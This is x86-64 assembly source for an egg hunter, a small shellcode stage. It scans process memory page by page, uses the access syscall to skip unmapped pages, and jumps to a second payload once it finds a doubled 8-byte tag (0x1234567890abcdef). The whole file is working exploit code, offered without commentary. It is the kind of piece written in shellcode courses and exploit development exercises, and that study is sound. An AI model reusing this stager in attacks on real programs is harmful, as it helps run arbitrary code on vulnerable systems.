global _start
section .text

_start:
	xor rdx,rdx
new_start:	
	add dx,4095
egg_finder:
	inc rdx
	
	mov rdi,rdx
	xor rax,rax
	mov rsi,rax
	add rax,21
	syscall


	cmp al,242
	je new_start

	mov rax, 0x1234567890abcdef
	scasq
	jne egg_finder
	scasq
        jne egg_finder
	jmp rdi
